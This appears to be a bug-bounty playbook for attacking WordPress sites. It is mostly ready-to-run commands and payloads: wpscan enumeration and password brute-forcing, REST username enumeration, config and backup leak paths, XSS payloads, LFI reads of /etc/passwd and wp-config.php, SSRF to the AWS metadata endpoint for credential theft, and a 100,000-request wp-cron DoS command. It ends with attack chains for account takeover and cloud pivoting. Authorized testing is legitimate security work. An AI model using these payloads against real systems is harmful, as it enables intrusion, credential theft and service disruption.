# wordpress-recon — WordPress bug-hunting playbook

**Source:** `packs/writeups/mastering-wordpress-bug-hunting-a-complete-guide-for-security-researchers.md` (CoffinXP).

WordPress powers a large slice of the web. Almost every "target" bounty scope contains at least one WP install (blog, marketing site). Vulns almost never live in core — they live in plugins, themes, misconfig.

## 0. Detect WP
```bash
curl -s https://TARGET/ | grep -iE 'wp-content|wp-includes|generator.*wordpress'
curl -s https://TARGET/readme.html | head
curl -s https://TARGET/wp-includes/js/wp-embed.min.js -o /dev/null -w '%{http_code}\n'
```

## 1. wpscan enumeration
```bash
wpscan --url https://TARGET --disable-tls-checks --api-token "$WPSCAN_TOKEN" -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

| Flag | Purpose |
|---|---|
| `-e vp` | vulnerable plugins |
| `-e ap` | all plugins |
| `-e p` | popular plugins |
| `-e vt` | vulnerable themes |
| `-e at` | all themes |
| `-e u` | usernames (user IDs 1–5) |
| `-e cb` | exposed config backups |
| `-e dbe` | publicly accessible DB exports |

## 2. Username enumeration (REST API)
```
/wp-json/wp/v2/users
/wp-json/wp/v2/users/1..N
/wp-json/?rest_route=/wp/v2/users/
/index.php?rest_route=/wp/v2/users
/wp-json/wp/v2/users?search=admin
/wp-json/wp/v2/users?orderby=id&order=asc
```

## 3. Password brute-force (only within authorized scope)
```bash
wpscan --url https://TARGET --usernames users.txt --passwords passwords.txt --disable-tls-checks --max-threads 10
# XML-RPC brute (higher throughput)
wpscan --url https://TARGET --usernames admin --passwords rockyou.txt --disable-tls-checks --max-threads 10
```

## 4. Exposed config leaks (`brain/payloads/sensitive-files.txt` supplement)
```
/wp-config.php{,.bak,.save,.old,.orig,~,.txt,.zip,.tar.gz,.backup}
/.env{,.bak,.old,.save,.example,.local}
/backup.zip /backup.tar.gz /db.sql /database.sql /dump.sql
/wp-content/debug.log
/wp-config-sample.php
/.htaccess /.htpasswd /phpinfo.php
/wp-admin/install.php
/wp-admin/setup-config.php?step=1
```

## 5. Registration-page exposure
```yaml
# Nuclei template — detect exposed WP registration
id: wp-login-register-detect
requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-login.php?action=register"
    matchers-condition: and
    matchers:
      - type: word
        words: ["user_login","user_email"]
        condition: and
      - type: status
        status: [200]
```

## 6. XML-RPC (`xmlrpc.php`)
Detect: `POST /xmlrpc.php` with `<methodCall><methodName>system.listMethods</methodName></methodCall>`.
Abuse: brute-force via `wp.getUsersBlogs`, DDoS amplification via `pingback.ping`, `system.multicall` mass ops.

## 7. admin-ajax abuse
```
domain/wp-admin/admin-ajax.php?action=tie_get_user_weather&options={'location':'Cairo','units':'C','forecast_days':'5<%2Fscript><script>alert(document.domain)<%2Fscript>','custom_name':'Cairo','animated':'true'}
domain/wp-content/themes/ambience/thumb.php?src=<body onload=prompt(1)>.png
```

## 8. LFI / RFI in plugins
```
domain/wp-content/plugins/PLUGIN/download.php?file=../../../../wp-config.php
domain/wp-admin/admin.php?page=../../../../etc/passwd
domain/?cat=../../../../../../etc/passwd
domain/?author=../../../../../../wp-config.php
```

Fuzz param with `brain/payloads/lfi.txt` (coffinxp/payloads/lfi.txt is the canonical source).

## 9. Subdomain takeover on WP subdomains
Common danglers: `blog.target.com`, `shop.target.com` pointing to old WP.com hosting / GitHub Pages / abandoned SaaS. Detect with `subzy` + `references/router.md` subdomain-takeover row.

## 10. Directory listing
```
/wp-content/uploads/    → media leaks
/wp-content/plugins/    → plugin fingerprint + versions
/wp-content/themes/     → theme code
/wp-includes/           → core PHP (rare)
/wp-content/backup/     → JACKPOT if listed
/wp-admin/backup/       → JACKPOT if listed
```

## 11. SSRF via oEmbed proxy
```
https://TARGET/wp-json/oembed/1.0/proxy?url=http://169.254.169.254/latest/meta-data/
https://TARGET/wp-json/oembed/1.0/proxy?url=http://127.0.0.1:8080/
```

Hits AWS metadata → IAM creds theft (see `brain/payloads/ssrf.txt`).

## 12. wp-cron DoS
```bash
./doser -t 100000 -g "https://TARGET/wp-cron.php"
```
100k reqs → 500 = DoS confirmed.

## 13. High-impact plugin CVE catalog (2024–2025)
| CVE | Component | Class | Impact |
|---|---|---|---|
| CVE-2024-25600 | Bricks theme | RCE via theme | RCE unauthenticated |
| CVE-2024-10924 | Really Simple Security | 2FA bypass | Full admin auth bypass |
| CVE-2024-27956 | WordPress Automatic plugin | SQLi | Widely exploited |
| CVE-2024-8353 | GiveWP plugin | PHP object injection → RCE | Critical |
| CVE-2025-24000 | Post SMTP plugin | Broken access control | Low-priv → admin pass reset |
| CVE-2025-0912 | GiveWP plugin | PHP object injection → RCE | Critical |
| CVE-2024-31211 | WP core | RCE via POP chain | Critical |
| CVE-2020-28032 | WP core | PHP object-injection gadget | Leads to RCE |

Live DB: [wpscan.com/wordpresses](https://wpscan.com/wordpresses/).

## 14. Google dorks
```
site:*.TARGET inurl:wp-content
site:*.TARGET "Powered by WordPress"
inurl:wp-config.php
site:*.TARGET ext:sql "INSERT INTO wp_users"
site:*.TARGET "WordPress database error"
site:*.TARGET intitle:"index of" wp-includes
```

## Chains
- WP-user-enum → weak-password brute → **admin ATO**
- admin-ajax XSS → **stored XSS in admin panel** → session hijack
- LFI → `/etc/passwd` → **RCE via log poisoning** or config leak
- oEmbed SSRF → **AWS IMDSv1** → **IAM cred theft** → cloud pivot
- Directory listing → backup zip → **DB dump** → password hashes → offline crack
- Subdomain takeover on blog.TARGET → **phishing surface** in trusted parent org
